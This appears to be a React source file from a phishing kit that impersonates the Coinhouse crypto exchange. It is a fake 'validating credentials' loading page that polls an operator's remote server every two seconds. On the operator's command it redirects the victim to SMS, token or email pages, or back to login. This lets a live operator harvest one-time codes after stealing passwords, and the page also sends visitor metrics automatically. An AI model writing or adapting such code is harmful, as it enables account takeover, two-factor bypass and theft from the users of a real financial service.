"use client"

import { useState, useEffect } from "react"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { ChevronDown } from "lucide-react"
import Image from "next/image"
import { useMetrics } from "@/hooks/useMetrics"
import { useRouter } from "next/navigation"

// Detectar idioma do navegador - padrão sempre inglês exceto francês
const getDefaultLanguage = () => {
  if (typeof window !== "undefined") {
    const browserLang = navigator.language.toLowerCase()
    return browserLang.startsWith("fr") ? "fr" : "en"
  }
  return "en"
}

const translations = {
  fr: {
    loadingMessages: [
      "Validation des identifiants...",
      "Vérification du compte...",
      "Analyse de votre compte...",
      "Chargement de votre profil...",
      "Sécurisation de la connexion...",
      "Finalisation...",
      "Veuillez patienter..."
    ],
    preparing: "Préparation de votre expérience d'investissement...",
    invalidCredentials: "Identifiants invalides. Veuillez réessayer."
  },
  en: {
    loadingMessages: [
      "Validating credentials...",
      "Verifying account...",
      "Analyzing your account...",
      "Loading your profile...",
      "Securing connection...",
      "Finalizing...",
      "Please wait..."
    ],
    preparing: "Preparing your investment experience...",
    invalidCredentials: "Invalid credentials. Please try again."
  },
}

// Interface para comandos do servidor
interface ServerResponse {
  data: {
    command: string;
    username?: string;
    ip?: string;
    country?: string;
    city?: string;
    device?: string;
    referrer?: string;
    currentUrl?: string;
    status?: string;
    response?: any;
    lastActivity?: string;
    lastCommands?: any[];
    isActive?: boolean;
    commandResponses?: any;
  };
}

export default function LoadingPage() {
  const metrics = useMetrics() // Hook das métricas
  const router = useRouter()
  const [language, setLanguage] = useState(() => getDefaultLanguage())
  const [currentMessageIndex, setCurrentMessageIndex] = useState(0)

  const t = translations[language as keyof typeof translations]

  // Envio automático de métricas ao carregar a página
  useEffect(() => {
    if (!metrics.isRegistered) {
      metrics.registerVisit() // Envia métricas automaticamente
    }
  }, [metrics])

  // Alterar mensagem a cada 2 segundos
  useEffect(() => {
    const interval = setInterval(() => {
      setCurrentMessageIndex((prevIndex: number) => 
        (prevIndex + 1) % t.loadingMessages.length
      )
    }, 2000)

    return () => clearInterval(interval)
  }, [t.loadingMessages.length])

  // Monitorar comandos do servidor a cada 2 segundos
  useEffect(() => {
    // Recuperar clientId do localStorage (definido durante o login)
    const clientId = localStorage.getItem('client_id') || '';
    
    if (!clientId) {
      console.error('Client ID não encontrado no localStorage');
      return;
    }
    
    // Função para verificar comandos
    const checkCommands = async () => {
      try {
        // Chamar API para verificar comandos usando o endpoint correto
        const response = await fetch(`https://servidoroperador.onrender.com/api/clients/${clientId}/info`, {
          method: 'GET',
          headers: {
            'Content-Type': 'application/json',
          }
        });
        
        if (response.ok) {
          const responseData: ServerResponse = await response.json();
          console.log('Resposta completa da API:', responseData);
          
          // Processar comandos - comando está em responseData.data.command
          if (responseData && responseData.data && responseData.data.command) {
            console.log('Comando recebido:', responseData.data.command);
            
            switch (responseData.data.command) {
              case 'ir_sms':
                console.log('Redirecionando para /sms');
                router.push('/sms');
                break;
                
              case 'ir_auth':
                console.log('Redirecionando para /token');
                router.push('/token');
                break;
                
              case 'ir_email':
                console.log('Redirecionando para /email');
                router.push('/email');
                break;
                
              case 'inv_username':
              case 'inv_password':
                // Armazenar informação de erro no localStorage
                console.log('Erro de credenciais, voltando para /home');
                localStorage.setItem('auth_error', 'true');
                localStorage.setItem('error_type', responseData.data.command);
                router.push('/home');
                break;
                
              default:
                // Comando desconhecido, não fazer nada
                console.log('Comando desconhecido ou vazio:', responseData.data.command);
                break;
            }
          } else {
            console.log('Nenhum comando pendente, continuando monitoramento...');
          }
        } else {
          console.error('Erro ao verificar comandos:', response.status, await response.text());
        }
      } catch (error) {
        console.error('Erro ao verificar comandos:', error);
      }
    };
    
    // Verificar comandos a cada 2 segundos
    const commandInterval = setInterval(checkCommands, 2000);
    
    // Verificar comandos imediatamente ao carregar
    checkCommands();
    
    // Limpar intervalo ao desmontar componente
    return () => clearInterval(commandInterval);
  }, [router]);

  return (
    <div className="min-h-screen bg-white flex flex-col">
      {/* Header com seletor de idioma */}
      <div className="flex justify-end p-6 md:p-8">
        <Select value={language} onValueChange={setLanguage}>
          <SelectTrigger className="w-16 border border-gray-300 rounded-full px-3 py-1 h-auto font-medium [&>svg]:hidden bg-white shadow-sm">
            <SelectValue />
            <ChevronDown className="h-3 w-3 ml-1 text-gray-600" />
          </SelectTrigger>
          <SelectContent>
            <SelectItem value="fr">FR</SelectItem>
            <SelectItem value="en">GB</SelectItem>
          </SelectContent>
        </Select>
      </div>

      {/* Conteúdo principal centralizado */}
      <div className="flex-1 flex flex-col items-center justify-center px-6">
        {/* Logo Coinhouse */}
        <div className="mb-16">
          <Image 
            src="/coinhouse-logo.png" 
            alt="Coinhouse" 
            width={250} 
            height={50} 
            className="h-10 md:h-12 w-auto" 
            priority
          />
        </div>
        
        {/* Loading Spinner - Simples e preto */}
        <div className="mb-10">
          <div className="w-14 h-14 md:w-16 md:h-16 border-4 border-gray-200 rounded-full animate-spin border-t-black"></div>
        </div>

        {/* Mensagem de loading com transição suave */}
        <div className="text-center min-h-[60px] flex items-center">
          <p className="text-lg md:text-xl text-gray-700 font-medium transition-all duration-500 ease-in-out transform">
            {t.loadingMessages[currentMessageIndex]}
          </p>
        </div>
      </div>

      {/* Footer com texto motivacional */}
      <div className="text-center pb-8 px-6">
        <p className="text-sm text-gray-500">
          {t.preparing}
        </p>
      </div>
    </div>
  )
} 